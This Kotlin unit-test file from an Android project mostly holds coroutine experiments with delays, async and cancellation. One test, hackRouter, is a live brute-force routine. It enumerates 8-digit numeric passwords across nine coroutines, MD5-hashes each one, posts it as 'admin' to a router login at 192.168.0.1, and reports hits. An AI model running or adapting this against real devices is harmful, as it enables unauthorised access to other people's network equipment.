package com.mitsuki.ehit

import com.mitsuki.armory.httprookie.HttpRookie
import com.mitsuki.armory.httprookie.convert.StringConvert
import com.mitsuki.armory.httprookie.request.params
import com.mitsuki.armory.httprookie.response.Response
import kotlinx.coroutines.*
import org.junit.Test

import org.junit.Assert.*
import java.security.MessageDigest
import kotlin.math.pow
import kotlin.system.measureTimeMillis

/**
 * Example local unit test, which will execute on the development machine (host).
 *
 * See [testing documentation](http://d.android.com/tools/testing).
 */
class ExampleUnitTest {
    @Test
    fun addition_isCorrect() {
        assertEquals(4, 2 + 2)
    }

    @Test
    fun test() {
//        GlobalScope.launch {
//            delay(4000)
//            println("GlobalScope: ${Thread.currentThread().name}")
//        }

        runBlocking {
            delay(4000)
            println("1")

            withContext(Dispatchers.IO) {
                delay(4000)
                println("2")
            }
        }
        println("3")
        runBlocking { delay(10000) }
    }

    @Test
    fun runBlockingTest() = runBlocking<Unit> {
        val job = launch {
            try {
                repeat(1000) { i ->
                    println("job: I'm sleeping $i ...")
                    delay(500L)
                }
            } finally {
                withContext(NonCancellable) {
                    println("job: I'm running finally")
                    delay(1000L)
                    println("job: And I've just delayed for 1 sec because I'm non-cancellable")
                }
            }
        }
        delay(1300L) // 延迟一段时间
        println("main: I'm tired of waiting!")
        job.cancelAndJoin() // 取消该作业并等待它结束
        println("main: Now I can quit.")

//        val job = launch {
//            try {
//                repeat(1000) { i ->
//                    println("job: I'm sleeping $i ...")
//                    delay(500L)
//                }
//            } finally {
//                println("job: I'm running finally")
//            }
//        }
//        delay(1300L) // 延迟一段时间
//        println("main: I'm tired of waiting!")
//        job.cancelAndJoin() // 取消该作业并且等待它结束
//        println("main: Now I can quit.")
    }


    @Test
    fun ssss() = runBlocking<Unit> {
        launch {
            delay(4000)
            println("1")
        }

        launch {
            println("2")
        }

        println("3")


        launch(CoroutineName("sdf")) {
            delay(2000L)
            println("Task from runBlocking")
        }
        coroutineScope { // 创建一个协程作用域
            launch {
                delay(5000L)
                println("Task from nested launch")
            }

            delay(1000L)
            println("Task from coroutine scope") // 这一行会在内嵌 launch 之前输出
        }

        println("--------------------")
        println("Coroutine scope is over") // 这一行在内嵌 launch 执行完毕后才输出
    }


    suspend fun doSomethingUsefulOne(): Int {
        delay(1000L) // 假设我们在这里做了一些有用的事
        return 13
    }

    suspend fun doSomethingUsefulTwo(): Int {
        delay(1000L) // 假设我们在这里也做了一些有用的事
        return 29
    }

    suspend fun doSomethingUsefulOneC(): Int {
        return withContext(Dispatchers.IO) {
            delay(1000L)
            13
        }
    }

    suspend fun doSomethingUsefulTwoC(): Int {
        return withContext(Dispatchers.IO) {
            delay(1000L)
            29
        }
    }

    @Test
    fun asyncTest() = runBlocking<Unit> {
        val time = measureTimeMillis {
            val one = async { doSomethingUsefulOne() }
            val two = async { doSomethingUsefulTwo() }
            println("The answer is ${one.await() + two.await()}")
        }
        println("Completed in $time ms")
    }

    @Test
    fun noAsyncTest() = runBlocking<Unit> {
        val time = measureTimeMillis {
            val one = doSomethingUsefulOneC()
            val two = doSomethingUsefulTwoC()
            println("The answer is ${one + two}")
        }
        println("Completed in $time ms")
    }


    @Test
    fun hackRouter() = runBlocking<Unit> {
        //尝试8位暴力破解
        //分成9组
        //

//        val a = async {
//            for (i in 0 until 9999999) {
//                val pw = i.toString().run {
//                    var n = this
//                    for (t in length until 7) {
//                        n = "0$n"
//                    }
//                    n
//                }
//                tryPw("0$pw")
//            }
//        }

        val b = async { kkk("1", 7.0) }

        val c = async { kkk("2", 7.0) }

        val d = async { kkk("3", 7.0) }

        val e = async { kkk("4", 7.0) }

        val f = async { kkk("5", 7.0) }

        val g = async { kkk("6", 7.0) }

        val h = async { kkk("7", 7.0) }

        val i = async { kkk("8", 7.0) }

        val j = async { kkk("9", 7.0) }

//        a.await()
        b.await()
        c.await()
        d.await()
        e.await()
        f.await()
        g.await()
        h.await()
        i.await()
        j.await()
    }

    private suspend fun kkk(head: String, co: Double) = withContext(Dispatchers.IO) {

        val end = 10.0.pow(co).toInt() - 1
        for (i in 0 until end) {
            val pw = i.toString().run {
                var n = this
                for (t in length until co.toInt()) {
                    n = "0$n"
                }
                n
            }
            tryPw("$head$pw")
        }

    }


    private fun tryPw(pw: String) {
        val data = HttpRookie.post<String>("http://192.168.0.1/login/Auth") {
            convert = StringConvert()
            params("username" , "admin")
            params("password" , md5(pw))
        }.execute()

        when (data) {
            is Response.Success -> {
                if (data.body != "1") {
                    println("success---> $pw")
                } else {
                    println("fail---> $pw")
                }
            }
            is Response.Fail -> {
                println("${data.throwable}")
            }
        }
    }

    private fun md5(source: String): String {
        val result = MessageDigest.getInstance("MD5").digest(source.toByteArray())
        return with(StringBuilder()) {
            result.forEach {
                val hex = it.toInt() and (0xFF)
                val hexStr = Integer.toHexString(hex)
                if (hexStr.length == 1) {
                    append("0").append(hexStr)
                } else {
                    append(hexStr)
                }
            }
            toString()
        }
    }
}
